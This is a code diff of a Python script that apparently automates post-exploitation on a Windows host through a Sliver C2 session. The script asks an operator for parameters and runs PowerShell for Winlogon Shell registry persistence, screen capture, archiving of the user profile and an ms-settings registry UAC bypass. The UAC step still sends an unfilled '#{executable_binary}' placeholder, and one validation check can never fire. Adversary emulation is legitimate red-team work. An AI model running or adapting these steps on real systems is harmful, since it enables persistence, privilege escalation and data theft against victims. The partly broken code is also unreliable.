@@ -28,7 +28,7 @@ def confirm_action(prompt: str = "Keep going with the next attack step?") -> boo
 async def main():
     print_welcome_message()
     from attack_executor.config import load_config
-    config = load_config(config_file_path="/home/kali/Desktop/Aurora-executor-demo/config.ini")
+    config = load_config(config_file_path="/home/kali/Desktop/xiangmu/attack_executor-main/aurora/executor/config.ini")
     from attack_executor.post_exploit.Sliver import SliverExecutor
     sliver_executor = SliverExecutor(config=config)
     console.print("""\
@@ -75,18 +75,10 @@ async def main():
 
     user_params["SessionID"] = sliver_sessionid
 
-    # Sliver command execution
-    console.print(f"[bold cyan]\n[Sliver Executor] Executing: powershell[/]")
     confirm_action()
-    try:
-        await sliver_executor.powershell(user_params["SessionID"], user_params["Commands"])
-    except Exception as e:
-        console.print(f"[bold red]✗ Command failed: {str(e)}[/]")
-        raise
-
-    confirm_action()
-    commands = """
+    commands = rf"""
     Get-Process
+
     """
     await sliver_executor.powershell(session_id=sliver_sessionid,input_commands=commands)
 
@@ -112,8 +104,20 @@ async def main():
     confirm_action()
 
     confirm_action()
-    commands = """
-    Set-ItemProperty "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" "Shell" "explorer.exe, #{binary_to_execute}" -Force
+
+    console.print(f"[bold cyan]\n📌[PowerShell Executor] Step 10 Parameter Input[/]")
+    console.print(f"[bold yellow]  Parameter: binary_to_execute[/]")
+    console.print(f"  Description: Path of binary to execute")
+    default_val = "C:\Windows\System32\cmd.exe"
+    user_input = console.input(
+        f"[bold]➤ Enter value for binary_to_execute [default: {default_val}]: [/]"
+    ) or default_val
+    if not user_input and False:
+        raise ValueError("Missing required parameter: binary_to_execute")
+    user_params["binary_to_execute"] = user_input
+    commands = rf"""
+    Set-ItemProperty "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" "Shell" "explorer.exe, {user_params["binary_to_execute"]}" -Force
+
     """
     await sliver_executor.powershell(session_id=sliver_sessionid,input_commands=commands)
 
@@ -121,13 +125,20 @@ async def main():
 
 
     confirm_action()
-    commands = """
-    Add-Type -AssemblyName System.Windows.Forms
-    $screen = [Windows.Forms.SystemInformation]::VirtualScreen
-    $bitmap = New-Object Drawing.Bitmap $screen.Width, $screen.Height
-    $graphic = [Drawing.Graphics]::FromImage($bitmap)
-    $graphic.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $bitmap.Size)
-    $bitmap.Save("#{output_file}")
+
+    console.print(f"[bold cyan]\n📌[PowerShell Executor] Step 12 Parameter Input[/]")
+    console.print(f"[bold yellow]  Parameter: output_file[/]")
+    console.print(f"  Description: Path where captured results will be placed")
+    default_val = "$env:TEMP\T1113.png"
+    user_input = console.input(
+        f"[bold]➤ Enter value for output_file [default: {default_val}]: [/]"
+    ) or default_val
+    if not user_input and False:
+        raise ValueError("Missing required parameter: output_file")
+    user_params["output_file"] = user_input
+    commands = rf"""
+    Add-Type -AssemblyName System.Windows.Forms;$screen = [Windows.Forms.SystemInformation]::VirtualScreen;$bitmap = New-Object Drawing.Bitmap $screen.Width, $screen.Height;$graphic = [Drawing.Graphics]::FromImage($bitmap);$graphic.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $bitmap.Size);$bitmap.Save("{user_params["output_file"]}")
+
     """
     await sliver_executor.powershell(session_id=sliver_sessionid,input_commands=commands)
 
@@ -156,8 +167,31 @@ async def main():
         raise
 
     confirm_action()
-    commands = """
-    dir #{input_file} -Recurse | Compress-Archive -DestinationPath #{output_file}
+
+    console.print(f"[bold cyan]\n📌[PowerShell Executor] Step 14 Parameter Input[/]")
+    console.print(f"[bold yellow]  Parameter: input_file[/]")
+    console.print(f"  Description: Path that should be compressed into our output file")
+    default_val = "$env:USERPROFILE"
+    user_input = console.input(
+        f"[bold]➤ Enter value for input_file [default: {default_val}]: [/]"
+    ) or default_val
+    if not user_input and False:
+        raise ValueError("Missing required parameter: input_file")
+    user_params["input_file"] = user_input
+
+    console.print(f"[bold cyan]\n📌[PowerShell Executor] Step 14 Parameter Input[/]")
+    console.print(f"[bold yellow]  Parameter: output_file[/]")
+    console.print(f"  Description: Path where resulting compressed data should be placed")
+    default_val = "$env:USERPROFILE\T1560-data-ps.zip"
+    user_input = console.input(
+        f"[bold]➤ Enter value for output_file [default: {default_val}]: [/]"
+    ) or default_val
+    if not user_input and False:
+        raise ValueError("Missing required parameter: output_file")
+    user_params["output_file"] = user_input
+    commands = rf"""
+    dir {user_params["input_file"]} -Recurse | Compress-Archive -DestinationPath {user_params["output_file"]}
+
     """
     await sliver_executor.powershell(session_id=sliver_sessionid,input_commands=commands)
 
@@ -170,6 +204,17 @@ async def main():
     confirm_action()
 
     confirm_action()
+
+    console.print(f"[bold cyan]\n📌[PowerShell Executor] Step 16 Parameter Input[/]")
+    console.print(f"[bold yellow]  Parameter: executable_binary[/]")
+    console.print(f"  Description: Binary to execute with UAC Bypass")
+    default_val = "C:\Windows\System32\cmd.exe"
+    user_input = console.input(
+        f"[bold]➤ Enter value for executable_binary [default: {default_val}]: [/]"
+    ) or default_val
+    if not user_input and False:
+        raise ValueError("Missing required parameter: executable_binary")
+    user_params["executable_binary"] = user_input
     commands = """
     reg.exe add hkcu\software\classes\ms-settings\shell\open\command /ve /d "#{executable_binary}" /f
     reg.exe add hkcu\software\classes\ms-settings\shell\open\command /v "DelegateExecute" /f
@@ -234,15 +279,6 @@ async def main():
     print_finished_message()
 
     user_params["SessionID"] = sliver_sessionid
-
-    # Sliver command execution
-    console.print(f"[bold cyan]\n[Sliver Executor] Executing: powershell[/]")
-    confirm_action()
-    try:
-        await sliver_executor.powershell(user_params["SessionID"], user_params["Commands"])
-    except Exception as e:
-        console.print(f"[bold red]✗ Command failed: {str(e)}[/]")
-        raise
 
 
 if __name__ == "__main__":
